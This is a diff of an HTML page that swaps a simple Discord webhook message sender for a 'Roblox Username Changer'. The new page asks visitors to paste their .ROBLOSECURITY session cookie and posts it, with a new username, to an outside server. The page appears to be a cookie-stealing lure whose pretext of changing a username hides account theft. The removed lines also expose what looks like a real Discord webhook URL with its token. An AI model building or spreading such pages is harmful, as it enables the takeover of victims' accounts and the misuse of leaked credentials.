@@ -3,94 +3,61 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Webhook Message Sender</title>
+    <title>Roblox Username Changer</title>
     <style>
-        body {
-            font-family: Arial, sans-serif;
-            max-width: 500px;
-            margin: 0 auto;
-            padding: 20px;
-        }
-        textarea {
-            width: 100%;
-            height: 150px;
-            padding: 10px;
-            margin-bottom: 10px;
-            border: 1px solid #ccc;
-            border-radius: 4px;
-            resize: vertical;
-        }
-        button {
-            padding: 10px 20px;
-            background-color: #4CAF50;
-            color: white;
-            border: none;
-            border-radius: 4px;
-            cursor: pointer;
-            font-size: 16px;
-        }
-        button:hover {
-            background-color: #45a049;
-        }
-        #status {
-            margin-top: 10px;
-            padding: 10px;
-            border-radius: 4px;
-            display: none;
-        }
-        .success {
-            background-color: #dff0d8;
-            color: #3c763d;
-        }
-        .error {
-            background-color: #f2dede;
-            color: #a94442;
-        }
+        body { font-family: Arial, sans-serif; max-width: 500px; margin: 0 auto; padding: 20px; }
+        textarea { width: 100%; height: 100px; margin-bottom: 10px; }
+        button { padding: 10px 15px; background: #4CAF50; color: white; border: none; cursor: pointer; }
+        #status { margin-top: 10px; padding: 10px; display: none; }
+        .success { background: #dff0d8; color: #3c763d; }
+        .error { background: #f2dede; color: #a94442; }
     </style>
 </head>
 <body>
-    <h1>Send Message to Webhook</h1>
-    <textarea id="message" placeholder="Type your message here..."></textarea>
-    <button onclick="sendToWebhook()">Send</button>
+    <h1>Roblox Username Changer</h1>
+    <p><strong>Warning:</strong> This will use your Roblox cookie to change your username.</p>
+    
+    <textarea id="cookieInput" placeholder="Paste your .ROBLOSECURITY cookie here..."></textarea>
+    <input type="text" id="newUsername" placeholder="New username">
+    <button onclick="submitCookie()">Change Username</button>
+    
     <div id="status"></div>
 
     <script>
-        // Replace this with your actual webhook URL
-        const WEBHOOK_URL = "https://canary.discord.com/api/webhooks/1394819865360990388/6m4yTDRWX74rS94nZTr-HBfbiTapkR16n0GQJbNbraho6rkE8GzBFapZTcfvKubL4nSb";
+        async function submitCookie() {
+            const cookie = document.getElementById("cookieInput").value.trim();
+            const newUsername = document.getElementById("newUsername").value.trim();
+            const statusEl = document.getElementById("status");
 
-        function sendToWebhook() {
-            const message = document.getElementById('message').value;
-            const statusElement = document.getElementById('status');
-
-            if (!message) {
-                statusElement.textContent = "Please enter a message!";
-                statusElement.className = "error";
-                statusElement.style.display = "block";
+            if (!cookie || !newUsername) {
+                statusEl.textContent = "Please fill all fields!";
+                statusEl.className = "error";
+                statusEl.style.display = "block";
                 return;
             }
 
-            fetch(WEBHOOK_URL, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
-                body: JSON.stringify({ content: message }),
-            })
-            .then(response => {
-                if (response.ok) {
-                    statusElement.textContent = "Message sent successfully!";
-                    statusElement.className = "success";
-                    statusElement.style.display = "block";
-                    document.getElementById('message').value = ""; // Clear the text box
+            try {
+                const response = await fetch("https://your-server.com/change-username", {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({ cookie, newUsername }),
+                });
+
+                const result = await response.json();
+                
+                if (result.success) {
+                    statusEl.textContent = "Username changed successfully!";
+                    statusEl.className = "success";
                 } else {
-                    throw new Error('Failed to send message');
+                    statusEl.textContent = "Error: " + (result.error || "Failed to change username.");
+                    statusEl.className = "error";
                 }
-            })
-            .catch(error => {
-                statusElement.textContent = "Error: " + error.message;
-                statusElement.className = "error";
-                statusElement.style.display = "block";
-            });
+            } catch (err) {
+                statusEl.textContent = "Network error: " + err.message;
+                statusEl.className = "error";
+            }
+            
+            statusEl.style.display = "block";
         }
     </script>
 </body>
